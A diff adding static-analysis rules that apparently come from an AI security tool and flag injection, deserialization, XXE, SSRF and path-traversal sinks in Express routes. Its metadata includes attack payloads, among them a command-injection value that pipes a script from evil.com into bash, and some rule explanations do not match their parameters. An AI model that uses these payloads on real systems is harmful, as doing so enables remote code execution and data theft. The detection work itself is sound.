@@ -1,0 +1,1013 @@
+rules:
+- id: fixora-wrapper-callback-router-get--api-admin-user-report
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.get(/api/admin/user_report)> = (...) => { ... }
+    - pattern: <callback:router.get(/api/admin/user_report)> = function(...) { ...
+        }
+  - pattern-either:
+    - pattern: db.execute(...)
+    - pattern: $OBJ.execute(...)
+    - pattern: execute(...)
+    - pattern: db.query(...)
+    - pattern: $OBJ.query(...)
+    - pattern: query(...)
+  message: 'SQL Injection via `req.params.filename`
+
+    Vulnerable Sink: Passes untrusted data directly to `db.execute, db.query`.'
+  severity: ERROR
+  languages: &id001
+  - javascript
+  - typescript
+  metadata: &id002
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: SQL Injection
+    confidence: HIGH
+    wrapper_defined_in: database.js
+    wraps:
+    - db.execute
+    - db.query
+    modules_used:
+    - <object>.execute
+    - <object>.query
+    vulnerable_parameter: req.params.filename
+    malicious_payload: admin' UNION SELECT password FROM credentials --
+    exploit_explanation: The attacker-controlled username is concatenated into the
+      SQL WHERE clause, allowing the payload to convert the predicate into an always-true
+      condition.
+    exploit_injected_example: <callback:router.get(/api/admin/user_report)>(req.params.filename
+      = admin' UNION SELECT password FROM credentials --)
+    impact_summary: Attackers can exfiltrate all rows from the table and bypass authorization
+      checks tied to user scoping.
+    cwe:
+    - CWE-89
+    owasp:
+    - A03:2021
+- id: fixora-taint-callback-router-get--api-admin-user-report
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.get(/api/admin/user_report)>(...)
+  - pattern: $OBJ.<callback:router.get(/api/admin/user_report)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.get(/api/admin/user_report)>`.
+
+    SQL Injection via `req.params.filename`
+
+    Vulnerable Sink: Passes untrusted data directly to `db.execute, db.query`.'
+  severity: ERROR
+  languages: *id001
+  metadata: *id002
+- id: fixora-wrapper-callback-router-post--api-import-config
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/import/config)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/import/config)> = function(...) { ... }
+  - pattern-either:
+    - pattern: yaml.load(...)
+    - pattern: $OBJ.load(...)
+    - pattern: load(...)
+  message: 'Insecure Deserialization via `req.body.yaml`
+
+    Vulnerable Sink: Passes untrusted data directly to `yaml.load`.'
+  severity: ERROR
+  languages: &id003
+  - javascript
+  - typescript
+  metadata: &id004
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Insecure Deserialization
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - yaml.load
+    modules_used:
+    - js-yaml
+    vulnerable_parameter: req.body.yaml
+    malicious_payload: '!exec "id"'
+    exploit_explanation: The attacker sends YAML containing a custom type that executes
+      a command during parsing.
+    exploit_injected_example: <callback:router.post(/api/import/config)>(req.body.yaml
+      = !exec "id")
+    impact_summary: Attackers can execute arbitrary system commands.
+- id: fixora-taint-callback-router-post--api-import-config
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/import/config)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/import/config)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/import/config)>`.
+
+    Insecure Deserialization via `req.body.yaml`
+
+    Vulnerable Sink: Passes untrusted data directly to `yaml.load`.'
+  severity: ERROR
+  languages: *id003
+  metadata: *id004
+- id: fixora-wrapper-callback-router-post--api-import-template
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/import/template)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/import/template)> = function(...) { ...
+        }
+  - pattern-either:
+    - pattern: yaml.load(...)
+    - pattern: $OBJ.load(...)
+    - pattern: load(...)
+  message: 'Insecure Deserialization via `req.body.yaml`
+
+    Vulnerable Sink: Passes untrusted data directly to `yaml.load`.'
+  severity: ERROR
+  languages: &id005
+  - javascript
+  - typescript
+  metadata: &id006
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Insecure Deserialization
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - yaml.load
+    modules_used:
+    - js-yaml
+    vulnerable_parameter: req.body.yaml
+    malicious_payload: '!exec "id"'
+    exploit_explanation: The attacker sends YAML containing a custom type that executes
+      a command during parsing.
+    exploit_injected_example: <callback:router.post(/api/import/template)>(req.body.yaml
+      = !exec "id")
+    impact_summary: Attackers can execute arbitrary system commands.
+- id: fixora-taint-callback-router-post--api-import-template
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/import/template)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/import/template)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/import/template)>`.
+
+    Insecure Deserialization via `req.body.yaml`
+
+    Vulnerable Sink: Passes untrusted data directly to `yaml.load`.'
+  severity: ERROR
+  languages: *id005
+  metadata: *id006
+- id: fixora-wrapper-callback-router-post--api-render-greeting
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/render/greeting)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/render/greeting)> = function(...) { ...
+        }
+  - pattern-either:
+    - pattern: ejs.render(...)
+    - pattern: $OBJ.render(...)
+    - pattern: render(...)
+  message: 'Command Injection via `req.body.name`
+
+    Vulnerable Sink: Passes untrusted data directly to `ejs.render`.'
+  severity: ERROR
+  languages: &id007
+  - javascript
+  - typescript
+  metadata: &id008
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Command Injection
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - ejs.render
+    modules_used:
+    - ejs
+    vulnerable_parameter: req.body.name
+    malicious_payload: <%= require('child_process').execSync('id').toString() %>
+    exploit_explanation: The attacker sends a name that contains EJS template expressions,
+      allowing them to execute arbitrary system commands.
+    exploit_injected_example: <callback:router.post(/api/render/greeting)>(req.body.name
+      = <%= require('child_process').execSync('id').toString() %>)
+    impact_summary: Attackers can execute arbitrary system commands.
+    cwe: &id009
+    - CWE-78
+    owasp: &id010
+    - A03:2021
+- id: fixora-taint-callback-router-post--api-render-greeting
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/render/greeting)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/render/greeting)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/render/greeting)>`.
+
+    Command Injection via `req.body.name`
+
+    Vulnerable Sink: Passes untrusted data directly to `ejs.render`.'
+  severity: ERROR
+  languages: *id007
+  metadata: *id008
+- id: fixora-wrapper-callback-router-post--api-render-page
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/render/page)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/render/page)> = function(...) { ... }
+  - pattern-either:
+    - pattern: nunjucks.renderString(...)
+    - pattern: $OBJ.renderString(...)
+    - pattern: renderString(...)
+  message: 'Command Injection via `req.body.content`
+
+    Vulnerable Sink: Passes untrusted data directly to `nunjucks.renderString`.'
+  severity: ERROR
+  languages: &id011
+  - javascript
+  - typescript
+  metadata: &id012
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Command Injection
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - nunjucks.renderString
+    modules_used:
+    - nunjucks
+    vulnerable_parameter: req.body.content
+    malicious_payload: '{{ require(''child_process'').execSync(''id'').toString()
+      }}'
+    exploit_explanation: The attacker sends content that contains Nunjucks template
+      expressions, allowing them to execute arbitrary system commands.
+    exploit_injected_example: <callback:router.post(/api/render/page)>(req.body.content
+      = {{ require('child_process').execSync('id').toString() }})
+    impact_summary: Attackers can execute arbitrary system commands.
+    cwe: *id009
+    owasp: *id010
+- id: fixora-taint-callback-router-post--api-render-page
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/render/page)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/render/page)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/render/page)>`.
+
+    Command Injection via `req.body.content`
+
+    Vulnerable Sink: Passes untrusted data directly to `nunjucks.renderString`.'
+  severity: ERROR
+  languages: *id011
+  metadata: *id012
+- id: fixora-wrapper-construct
+  patterns:
+  - pattern-either:
+    - pattern: function construct(...) { ... }
+    - pattern: const construct = (...) => { ... }
+    - pattern: let construct = (...) => { ... }
+    - pattern: var construct = (...) => { ... }
+    - pattern: this.construct = (...) => { ... }
+    - pattern: this.construct = function(...) { ... }
+    - pattern: 'construct: (...) => { ... }'
+    - pattern: 'construct: function(...) { ... }'
+    - pattern: construct(...) { ... }
+    - pattern: construct = (...) => { ... }
+    - pattern: construct = function(...) { ... }
+  - pattern-either:
+    - pattern: execSync(...)
+    - pattern: $OBJ.execSync(...)
+  message: 'Command Injection via `data`
+
+    Vulnerable Sink: Passes untrusted data directly to `execSync`.'
+  severity: ERROR
+  languages: &id013
+  - javascript
+  - typescript
+  metadata: &id014
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Command Injection
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - execSync
+    modules_used:
+    - child_process
+    vulnerable_parameter: data
+    malicious_payload: '!exec "id"'
+    exploit_explanation: The attacker sends data that contains a custom type that
+      executes a command during parsing.
+    exploit_injected_example: construct(data = !exec "id")
+    impact_summary: Attackers can execute arbitrary system commands.
+    cwe: *id009
+    owasp: *id010
+- id: fixora-taint-construct
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: construct(...)
+  - pattern: $OBJ.construct(...)
+  message: 'Taint tracked to vulnerable wrapper `construct`.
+
+    Command Injection via `data`
+
+    Vulnerable Sink: Passes untrusted data directly to `execSync`.'
+  severity: ERROR
+  languages: *id013
+  metadata: *id014
+- id: fixora-wrapper-callback-router-post--api-upload-archive
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/upload/archive)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/upload/archive)> = function(...) { ... }
+  - pattern-either:
+    - pattern: unzipper.Open.file(...)
+    - pattern: $OBJ.file(...)
+    - pattern: file(...)
+    - pattern: fs.mkdirSync(...)
+    - pattern: $OBJ.mkdirSync(...)
+    - pattern: mkdirSync(...)
+    - pattern: fs.createWriteStream(...)
+    - pattern: $OBJ.createWriteStream(...)
+    - pattern: createWriteStream(...)
+  message: 'Path Traversal via `req.file.path`
+
+    Vulnerable Sink: Passes untrusted data directly to `unzipper.Open.file, fs.mkdirSync,
+    fs.createWriteStream`.'
+  severity: ERROR
+  languages: &id015
+  - javascript
+  - typescript
+  metadata: &id016
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Path Traversal
+    confidence: HIGH
+    wrapper_defined_in: file_ops.js
+    wraps:
+    - unzipper.Open.file
+    - fs.mkdirSync
+    - fs.createWriteStream
+    modules_used:
+    - unzipper
+    - fs
+    vulnerable_parameter: req.file.path
+    malicious_payload: ../../etc/passwd
+    exploit_explanation: The attacker sends a ZIP file with an entry named ../../etc/passwd,
+      allowing them to overwrite system files.
+    exploit_injected_example: <callback:router.post(/api/upload/archive)>(req.file.path
+      = ../../etc/passwd)
+    impact_summary: Attackers can overwrite system files.
+    cwe: &id017
+    - CWE-22
+    owasp: &id018
+    - A01:2021
+- id: fixora-taint-callback-router-post--api-upload-archive
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/upload/archive)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/upload/archive)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/upload/archive)>`.
+
+    Path Traversal via `req.file.path`
+
+    Vulnerable Sink: Passes untrusted data directly to `unzipper.Open.file, fs.mkdirSync,
+    fs.createWriteStream`.'
+  severity: ERROR
+  languages: *id015
+  metadata: *id016
+- id: fixora-wrapper-callback-router-post--api-upload-avatar
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/upload/avatar)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/upload/avatar)> = function(...) { ... }
+  - pattern-either:
+    - pattern: fs.renameSync(...)
+    - pattern: $OBJ.renameSync(...)
+    - pattern: renameSync(...)
+  message: 'Path Traversal via `req.file.originalname`
+
+    Vulnerable Sink: Passes untrusted data directly to `fs.renameSync`.'
+  severity: ERROR
+  languages: &id019
+  - javascript
+  - typescript
+  metadata: &id020
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Path Traversal
+    confidence: HIGH
+    wrapper_defined_in: file_ops.js
+    wraps:
+    - fs.renameSync
+    modules_used:
+    - fs
+    vulnerable_parameter: req.file.originalname
+    malicious_payload: ../../etc/cron.d/backdoor.jpg
+    exploit_explanation: The attacker sends a file with a name that contains ../,
+      allowing them to write outside the upload directory.
+    exploit_injected_example: <callback:router.post(/api/upload/avatar)>(req.file.originalname
+      = ../../etc/cron.d/backdoor.jpg)
+    impact_summary: Attackers can write files outside the upload directory.
+    cwe: *id017
+    owasp: *id018
+- id: fixora-taint-callback-router-post--api-upload-avatar
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/upload/avatar)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/upload/avatar)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/upload/avatar)>`.
+
+    Path Traversal via `req.file.originalname`
+
+    Vulnerable Sink: Passes untrusted data directly to `fs.renameSync`.'
+  severity: ERROR
+  languages: *id019
+  metadata: *id020
+- id: fixora-wrapper-callback-router-post--api-import-xml
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/import/xml)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/import/xml)> = function(...) { ... }
+  - pattern-either:
+    - pattern: libxmljs.parseXml(...)
+    - pattern: $OBJ.parseXml(...)
+    - pattern: parseXml(...)
+  message: 'Insecure Deserialization via `req.body.xml`
+
+    Vulnerable Sink: Passes untrusted data directly to `libxmljs.parseXml`.'
+  severity: ERROR
+  languages: &id021
+  - javascript
+  - typescript
+  metadata: &id022
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Insecure Deserialization
+    confidence: HIGH
+    wrapper_defined_in: network.js
+    wraps:
+    - libxmljs.parseXml
+    modules_used:
+    - libxmljs
+    vulnerable_parameter: req.body.xml
+    malicious_payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+    exploit_explanation: The attacker sends XML that contains an external entity,
+      allowing them to read system files.
+    exploit_injected_example: <callback:router.post(/api/import/xml)>(req.body.xml
+      = <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>)
+    impact_summary: Attackers can read system files.
+- id: fixora-taint-callback-router-post--api-import-xml
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/import/xml)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/import/xml)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/import/xml)>`.
+
+    Insecure Deserialization via `req.body.xml`
+
+    Vulnerable Sink: Passes untrusted data directly to `libxmljs.parseXml`.'
+  severity: ERROR
+  languages: *id021
+  metadata: *id022
+- id: fixora-wrapper-callback-router-post--api-parse-svg
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/parse/svg)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/parse/svg)> = function(...) { ... }
+  - pattern-either:
+    - pattern: libxmljs.parseXml(...)
+    - pattern: $OBJ.parseXml(...)
+    - pattern: parseXml(...)
+  message: 'Insecure Deserialization via `req.body.svg`
+
+    Vulnerable Sink: Passes untrusted data directly to `libxmljs.parseXml`.'
+  severity: ERROR
+  languages: &id023
+  - javascript
+  - typescript
+  metadata: &id024
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Insecure Deserialization
+    confidence: HIGH
+    wrapper_defined_in: network.js
+    wraps:
+    - libxmljs.parseXml
+    modules_used:
+    - libxmljs
+    vulnerable_parameter: req.body.svg
+    malicious_payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+    exploit_explanation: The attacker sends SVG that contains an external entity,
+      allowing them to read system files.
+    exploit_injected_example: <callback:router.post(/api/parse/svg)>(req.body.svg
+      = <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>)
+    impact_summary: Attackers can read system files.
+- id: fixora-taint-callback-router-post--api-parse-svg
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/parse/svg)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/parse/svg)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/parse/svg)>`.
+
+    Insecure Deserialization via `req.body.svg`
+
+    Vulnerable Sink: Passes untrusted data directly to `libxmljs.parseXml`.'
+  severity: ERROR
+  languages: *id023
+  metadata: *id024
+- id: fixora-wrapper-callback-router-post--api-proxy
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/proxy)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/proxy)> = function(...) { ... }
+  - pattern-either:
+    - pattern: axios.get(...)
+    - pattern: $OBJ.get(...)
+    - pattern: get(...)
+  message: 'SSRF via `req.body.url`
+
+    Vulnerable Sink: Passes untrusted data directly to `axios.get`.'
+  severity: ERROR
+  languages: &id025
+  - javascript
+  - typescript
+  metadata: &id026
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: SSRF
+    confidence: HIGH
+    wrapper_defined_in: network.js
+    wraps:
+    - axios.get
+    modules_used:
+    - axios
+    vulnerable_parameter: req.body.url
+    malicious_payload: http://169.254.169.254
+    exploit_explanation: The attacker sends a URL that points to an internal IP address,
+      allowing them to access internal services.
+    exploit_injected_example: <callback:router.post(/api/proxy)>(req.body.url = http://169.254.169.254)
+    impact_summary: Attackers can access internal services.
+    cwe: &id027
+    - CWE-918
+    owasp: &id028
+    - A10:2021
+- id: fixora-taint-callback-router-post--api-proxy
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/proxy)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/proxy)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/proxy)>`.
+
+    SSRF via `req.body.url`
+
+    Vulnerable Sink: Passes untrusted data directly to `axios.get`.'
+  severity: ERROR
+  languages: *id025
+  metadata: *id026
+- id: fixora-wrapper-callback-router-post--api-fetch
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/fetch)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/fetch)> = function(...) { ... }
+  - pattern-either:
+    - pattern: axios.get(...)
+    - pattern: $OBJ.get(...)
+    - pattern: get(...)
+  message: 'SSRF via `req.body.url`
+
+    Vulnerable Sink: Passes untrusted data directly to `axios.get`.'
+  severity: ERROR
+  languages: &id029
+  - javascript
+  - typescript
+  metadata: &id030
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: SSRF
+    confidence: HIGH
+    wrapper_defined_in: network.js
+    wraps:
+    - axios.get
+    modules_used:
+    - axios
+    vulnerable_parameter: req.body.url
+    malicious_payload: http://169.254.169.254
+    exploit_explanation: The attacker sends a URL that points to an internal IP address,
+      allowing them to access internal services.
+    exploit_injected_example: <callback:router.post(/api/fetch)>(req.body.url = http://169.254.169.254)
+    impact_summary: Attackers can access internal services.
+    cwe: *id027
+    owasp: *id028
+- id: fixora-taint-callback-router-post--api-fetch
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/fetch)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/fetch)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/fetch)>`.
+
+    SSRF via `req.body.url`
+
+    Vulnerable Sink: Passes untrusted data directly to `axios.get`.'
+  severity: ERROR
+  languages: *id029
+  metadata: *id030
+- id: fixora-wrapper-callback-router-post--api-jobqueue-process
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/jobQueue.process)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/jobQueue.process)> = function(...) { ...
+        }
+  - pattern-either:
+    - pattern: exec(...)
+    - pattern: $OBJ.exec(...)
+  message: 'Command Injection via `job.data.to`
+
+    Vulnerable Sink: Passes untrusted data directly to `exec`.'
+  severity: ERROR
+  languages: &id031
+  - javascript
+  - typescript
+  metadata: &id032
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Command Injection
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - exec
+    modules_used:
+    - child_process
+    vulnerable_parameter: job.data.to
+    malicious_payload: a@b.com; curl http://evil.com/shell.sh | bash
+    exploit_explanation: The attacker sends a recipient that contains a shell command,
+      allowing them to execute arbitrary system commands.
+    exploit_injected_example: <callback:router.post(/api/jobQueue.process)>(job.data.to
+      = a@b.com; curl http://evil.com/shell.sh | bash)
+    impact_summary: Attackers can execute arbitrary system commands.
+    cwe: *id009
+    owasp: *id010
+- id: fixora-taint-callback-router-post--api-jobqueue-process
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/jobQueue.process)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/jobQueue.process)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/jobQueue.process)>`.
+
+    Command Injection via `job.data.to`
+
+    Vulnerable Sink: Passes untrusted data directly to `exec`.'
+  severity: ERROR
+  languages: *id031
+  metadata: *id032
+- id: fixora-wrapper-callback-router-post--api-git-log
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.post(/api/git/log)> = (...) => { ... }
+    - pattern: <callback:router.post(/api/git/log)> = function(...) { ... }
+  - pattern-either:
+    - pattern: execFile(...)
+    - pattern: $OBJ.execFile(...)
+  message: 'Command Injection via `req.body.branch`
+
+    Vulnerable Sink: Passes untrusted data directly to `execFile`.'
+  severity: ERROR
+  languages: &id033
+  - javascript
+  - typescript
+  metadata: &id034
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Command Injection
+    confidence: HIGH
+    wrapper_defined_in: execution.js
+    wraps:
+    - execFile
+    modules_used:
+    - child_process
+    vulnerable_parameter: req.body.branch
+    malicious_payload: --exec=id
+    exploit_explanation: The attacker sends a branch that contains a git command,
+      allowing them to execute arbitrary system commands.
+    exploit_injected_example: <callback:router.post(/api/git/log)>(req.body.branch
+      = --exec=id)
+    impact_summary: Attackers can execute arbitrary system commands.
+    cwe: *id009
+    owasp: *id010
+- id: fixora-taint-callback-router-post--api-git-log
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.post(/api/git/log)>(...)
+  - pattern: $OBJ.<callback:router.post(/api/git/log)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.post(/api/git/log)>`.
+
+    Command Injection via `req.body.branch`
+
+    Vulnerable Sink: Passes untrusted data directly to `execFile`.'
+  severity: ERROR
+  languages: *id033
+  metadata: *id034
+- id: fixora-wrapper-callback-router-get--api-files--filename
+  patterns:
+  - pattern-either:
+    - pattern: <callback:router.get(/api/files/:filename)> = (...) => { ... }
+    - pattern: <callback:router.get(/api/files/:filename)> = function(...) { ... }
+  - pattern-either:
+    - pattern: fs.statSync(...)
+    - pattern: $OBJ.statSync(...)
+    - pattern: statSync(...)
+    - pattern: fs.createReadStream(...)
+    - pattern: $OBJ.createReadStream(...)
+    - pattern: createReadStream(...)
+  message: 'Path Traversal via `req.params.filename`
+
+    Vulnerable Sink: Passes untrusted data directly to `fs.statSync, fs.createReadStream`.'
+  severity: ERROR
+  languages: &id035
+  - javascript
+  - typescript
+  metadata: &id036
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Path Traversal
+    confidence: HIGH
+    wrapper_defined_in: file_ops.js
+    wraps:
+    - fs.statSync
+    - fs.createReadStream
+    modules_used:
+    - fs
+    vulnerable_parameter: req.params.filename
+    malicious_payload: ../../etc/passwd
+    exploit_explanation: The attacker sends a filename that contains ../, allowing
+      them to read system files.
+    exploit_injected_example: <callback:router.get(/api/files/:filename)>(req.params.filename
+      = ../../etc/passwd)
+    impact_summary: Attackers can read system files.
+    cwe: *id017
+    owasp: *id018
+- id: fixora-taint-callback-router-get--api-files--filename
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: <callback:router.get(/api/files/:filename)>(...)
+  - pattern: $OBJ.<callback:router.get(/api/files/:filename)>(...)
+  message: 'Taint tracked to vulnerable wrapper `<callback:router.get(/api/files/:filename)>`.
+
+    Path Traversal via `req.params.filename`
+
+    Vulnerable Sink: Passes untrusted data directly to `fs.statSync, fs.createReadStream`.'
+  severity: ERROR
+  languages: *id035
+  metadata: *id036
+- id: fixora-wrapper-verifytoken
+  patterns:
+  - pattern-either:
+    - pattern: function verifyToken(...) { ... }
+    - pattern: const verifyToken = (...) => { ... }
+    - pattern: let verifyToken = (...) => { ... }
+    - pattern: var verifyToken = (...) => { ... }
+    - pattern: this.verifyToken = (...) => { ... }
+    - pattern: this.verifyToken = function(...) { ... }
+    - pattern: 'verifyToken: (...) => { ... }'
+    - pattern: 'verifyToken: function(...) { ... }'
+    - pattern: verifyToken(...) { ... }
+    - pattern: verifyToken = (...) => { ... }
+    - pattern: verifyToken = function(...) { ... }
+  - pattern-either:
+    - pattern: jwt.verify(...)
